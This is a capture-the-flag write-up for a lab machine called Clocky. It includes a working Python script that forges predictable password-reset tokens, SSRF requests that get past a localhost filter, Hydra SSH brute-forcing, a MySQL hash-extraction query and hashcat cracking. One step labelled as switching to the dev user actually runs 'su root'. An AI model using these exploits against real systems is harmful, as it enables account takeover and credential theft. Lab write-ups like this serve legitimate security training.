# Clocky

**Difficulty:** Medium

## Reconnaissance

Running a standard nmap scan revealed three open ports:
```bash
nmap -sC -sV -oN nmap.txt clocky.thm -p- -T4
```

**Results:**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
8000/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

The scan revealed something interesting - port 8000 has a `robots.txt` file with disallowed entries! Port 80 returned a 403 Forbidden, so I focused my attention on port 8000.

### Directory Fuzzing

I attempted to fuzz for subdomains and web content on port 80, but came up empty-handed. The only accessible entry point appeared to be the nginx server on port 8000, particularly the `robots.txt` file.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://clocky.thm \
     -H "Host: FUZZ.clocky.thm" \
     -fw 20
```

With no subdomains found, I turned my attention to the robots.txt hints.

## Initial Access

### Discovering Flag 1

Accessing the robots.txt file immediately revealed the first flag and three interesting disallowed file patterns:
```
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{REDACTED}
```

Perfect! The robots.txt was basically a roadmap telling us exactly what file extensions to look for.

### Finding the Source Code

Using the hints from robots.txt, I fuzzed for files with `.sql`, `.zip`, and `.bak` extensions:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://clocky.thm:8000/FUZZ \
     -e .sql,.zip,.bak
```

This revealed an `index.zip` file! After downloading and extracting it:
```bash
curl http://clocky.thm:8000/index.zip -o index.zip
unzip index.zip
```

The archive contained two valuable files:
- `app.py` - The Flask application source code
- `flag2.txt` - **Flag 2: THM{REDACTED}**

### Analyzing the Source Code

The `app.py` file revealed several critical pieces of information:

1. **A new endpoint** running on port 8080
2. **Developer names** in the comments: `jane` and `clarice`
3. **A predictable password reset token** vulnerability in the `/forgot_password` endpoint
4. **Database credentials** structure using `.env` file

Here's the vulnerable token generation code from app.py:
```python
value = datetime.datetime.now()
lnk = str(value)[:-4] + " . " + username.upper()
lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
```

The token is simply a SHA1 hash of the current timestamp plus the username - completely predictable!

### Exploiting the Reset Token

I wrote a Python script to exploit the predictable token generation:
```python
#!/usr/bin/env python3
import datetime, hashlib, requests

TARGET = "http://clocky.thm:8080"
USERNAME = "administrator"
TIME_DIFF = datetime.timedelta(hours=1)  # Adjust for timezone

# Trigger password reset
requests.post(f"{TARGET}/forgot_password", data={"username": USERNAME})
print("[*] Password reset triggered, testing tokens...")

# Generate and test tokens
now = datetime.datetime.now() - TIME_DIFF
for i in range(10):
    for j in range(1000):
        test_time = now - datetime.timedelta(seconds=i, milliseconds=j)
        token = hashlib.sha1((str(test_time)[:-4] + " . " + USERNAME.upper()).encode()).hexdigest()
        
        r = requests.get(f"{TARGET}/password_reset?token={token}")
        if "Invalid" not in r.text:
            print(f"[+] Valid token found: {TARGET}/password_reset?token={token}")
            break
```

The script works by:
1. Triggering a password reset request
2. Generating tokens for the last few seconds using the same algorithm
3. Testing each token until we find the valid one

After successfully resetting the password, I logged into the administrator account at `http://clocky.thm:8080/administrator`.

### Discovering the SSRF Vulnerability

Upon logging in, I obtained **Flag 3: THM{REDACTED}** directly from the dashboard page.

The dashboard had an interesting feature - it allowed users to input a URL and download the response as a file. This screamed **Server-Side Request Forgery (SSRF)**!

Testing confirmed the SSRF vulnerability:
```bash
curl -X POST http://clocky.thm:8080/dashboard \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "location=http://example.com"
```

However, there was a filter blocking `localhost` and `127.0.0.1`. Time to find a bypass!

### Bypassing the Localhost Filter

I tested various localhost representations and found that **URL-encoded characters** bypassed the filter:
```bash
# lo%63alhost works! (the 'c' is URL-encoded)
curl -X POST http://clocky.thm:8080/dashboard \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "location=http://lo%63alhost/"
```

This gave me access to the internal services! I could now reach port 80 which was previously forbidden.

### Extracting the Database Schema

Remembering the `database.sql` file mentioned in app.py, I used the SSRF to retrieve it:
```bash
curl -X POST http://clocky.thm:8080/dashboard \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "location=http://lo%63alhost/database.sql" \
  -o database.sql
```

**Jackpot!** The file contained:
```sql
Flag 4: THM{REDACTED}

CREATE USER 'clocky_user'@'localhost' IDENTIFIED BY 'REDACTED';
INSERT INTO passwords (password) VALUES ("REDACTED");
```

## Gaining SSH Access

With multiple credentials in hand, I created wordlists and used Hydra to brute-force SSH:

**Usernames (users.txt):**
```
administrator
clocky_user
jane
clarice
clocky
root
www-data
ubuntu
debian
dev
```

**Passwords (passwords.txt):**
```
REDACTED
REDACTED
```

Running Hydra:
```bash
hydra -L users.txt -P passwords.txt ssh://clocky.thm -t 4 -VI
```

**Success!**
```
[22][ssh] host: clocky.thm   login: clarice   password: REDACTED
```

I connected via SSH and obtained **Flag 5** from `/home/clarice/flag.txt`.

## Privilege Escalation

### Enumerating the System

After landing initial SSH access as `clarice`, I began standard enumeration:
```bash
# Look for SUID binaries
find / -perm -4000 2>/dev/null

# Check for interesting files
ls -la ~/app/
```

In the application directory, I found a `.env` file:
```bash
cat ~/app/.env
db=REDACTED
```

### MySQL Enumeration

I connected to MySQL using the discovered credentials:
```bash
mysql -u clocky_user -p
# Password: REDACTED
```

First, I explored the database structure:
```sql
SHOW DATABASES;
USE mysql;
SHOW TABLES;
```

### Extracting MySQL Hashes

I needed to extract password hashes from the MySQL user table. However, the standard format wasn't easily viewable, so I used a conversion query:
```sql
SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3), LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```

This revealed several hashes, including one for the `dev` user:
```
dev: $mysql$A$0005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142
```

### Cracking the Hash

I saved the hash and used Hashcat to crack it:
```bash
cat > dev_hash.txt << 'EOF'
$mysql$A$0005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142
EOF

hashcat -m 7401 dev_hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked!**
```
Password: REDACTED
```

### Switching to dev User

With the cracked password, I switched to the `dev` user:
```bash
su root
# Password: REDACTED
```

Finally, I obtained the last flag:
```bash
cat /root/flag6.txt
```
